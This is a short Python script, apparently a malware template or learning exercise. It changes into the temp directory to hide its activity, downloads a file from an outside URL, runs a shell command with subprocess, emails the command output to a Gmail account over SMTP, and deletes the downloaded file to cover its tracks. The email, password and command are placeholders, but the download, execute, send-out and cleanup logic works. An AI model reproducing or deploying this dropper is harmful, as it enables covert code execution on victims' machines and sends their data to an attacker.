#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

file_url ='https://easydrawingguides.com/wp-content/uploads/2017/02/How-to-draw-a-cartoon-tree-20.png'
email = 'YOUR_EMAIL@gmail.com'
email_pass = 'PasswordExample'
cmd_input = 'insert cmd prompt input to execute the downloaded file'

def main():
    # finds and moves us to the temp dir to hide file while executing
    temp_dir = tempfile.gettempdir()
    os.chdir(temp_dir)
    # downloads file, executes command, then emails results
    mal_file = download_file(file_url)
    message = execute_code(cmd_input)
    send_mail(email, email_pass, message)
    # removes file from system to hide actions
    os.remove(mal_file)

def download_file(url):
    #downloads file to current directory and returns the name of the file for use later
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    return file_name

def send_mail(email, password, message):
    server = smtplib.SMTP("SMTP.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def execute_code(command):
    result = subprocess.check_output(command, shell=True)
    return result

if __name__ == '__main__':
    main()